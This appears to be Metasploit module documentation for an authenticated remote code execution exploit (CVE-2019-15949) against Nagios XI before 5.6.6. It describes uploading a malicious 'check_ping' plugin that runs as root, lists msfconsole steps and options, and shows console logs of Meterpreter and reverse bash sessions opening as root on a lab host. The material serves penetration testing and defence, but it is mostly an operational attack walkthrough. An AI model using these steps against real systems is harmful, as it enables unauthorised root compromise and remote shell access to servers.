## Vulnerable Application
This module exploits a vulnerability (CVE-2019-15949) in Nagios XI before 5.6.6 in order to execute arbitrary commands as root.

The module's `check` method takes advantage of the `Msf::Exploit::Remote::HTTP::NagiosXi` mixin in order to authenticate to the target and
obtain the Nagios XI version number, which is then used to check if the target is Nagios XI prior to version 5.6.6 and therefore vulnerable.

Next, the module uploads a malicious plugin to the target and subsequently sends an HTTP GET request to `profile.php?cmd=download`.

This request downloads a system profile from the server and in the process launches the `getprofile.sh` script as root
via a passwordless sudo entry. This script executes the malicious plugin as root.

For all supported targets except `Linux (cmd)`, the module uses a command stager to write the exploit to the target via a malicious plugin.
However, this method may not work if Nagios XI is running in a restricted Unix environment like a minimal/custom CentOS installation.
In the latter case, the target must be set to `Linux (cmd)` and it is recommended to use the default `cmd/unix/reverse_bash` payload.

If the target is found to be vulnerable but the module completes without establishing a session,
try increasing the value of `WfsDelay` (the additional delay when waiting for a session).
The default value of this advanced option is 10 seconds. To check it, run `show advanced`.
Other possible solutions are changing the payload, manually setting the value of the `CMDSTAGER::FLAVOR` advanced option,
and setting the target to `Linux (cmd)` as explained above.

Valid credentials for a user with administrative privileges are required.
This module was successfully tested on Nagios XI 5.6.5 running on CentOS 7.
Please note that the module may behave differently when run against older versions of Nagios XI.
or instance, during a test against Nagios XI 5.4.10, the module failed to trigger execution of the payload.
Instead, the payload was executed randomly after a period of time (up to 5 minutes).
Moreover, the session that was ultimately established, was not a root session.

Vulnerable software for testing is vavailable [here](https://assets.nagios.com/downloads/nagiosxi/versions.php).
Detailed installation instructions are available
[here](https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf)
and an official video tutorial is available [here](https://www.youtube.com/watch?v=fBWA6t6dJ4I).

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/linux/http/nagios_xi_plugins_check_ping_authenticated_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set USERNAME [username for the Nagios XI account]`
5. Do: `set PASSWORD [password for the Nagios XI account]`
6. Do: `set target [target]`
7. Do: `set payload [payload]`
8. Do: `set LHOST [IP]`
9. Do: `exploit`

## Options
### PASSWORD
The password for the Nagios XI account to authenticate with.
### TARGETURI
The base path to Nagios XI. The default value is `/nagiosxi/`.
### USERNAME
The username for the Nagios XI account to authenticate with. The default value is `nagiosadmin`.

## Targets
```
Id  Name
--  ----
0   Linux (x86)
1   Linux (x64)
2   Linux (cmd)
```

## Scenarios
### Nagios XI 5.6.5 running on CentOS 7 - Linux (x64) target
```
msf6 exploit(linux/http/nagios_xi_plugins_check_ping_authenticated_rce) > show options 

Module options (exploit/linux/http/nagios_xi_plugins_check_ping_authenticated_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nagiosadmin      yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.14     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /nagiosxi/       yes       The base path to the NagiosXi application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin      yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.12     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)



msf6 exploit(linux/http/nagios_xi_plugins_check_ping_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.12:6001 
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.5
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the plugin to request the final payload...
[*] Sending stage (3008420 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.12:6001 -> 192.168.1.14:43402) at 2021-02-01 16:16:32 -0500
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
```
### Nagios XI 5.6.5 running on CentOS 7 - Linux (x86) target
```
msf6 exploit(linux/http/nagios_xi_plugins_check_ping_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.12:6002 
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.5
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (809/809 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the plugin to request the final payload...
[*] Sending stage (976712 bytes) to 192.168.1.14
[*] Meterpreter session 2 opened (192.168.1.12:6002 -> 192.168.1.14:43916) at 2021-02-01 16:16:54 -0500
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
```

### Nagios XI 5.6.5 running on CentOS 7 - Linux (cmd) target
```
msf6 exploit(linux/http/nagios_xi_plugins_check_ping_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.12:6004 
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.5
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the payload to connect back...
[*] Command shell session 4 opened (192.168.1.12:6004 -> 192.168.1.14:34600) at 2021-02-01 16:17:27 -0500
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

id
uid=0(root) gid=0(root) groups=0(root)
```
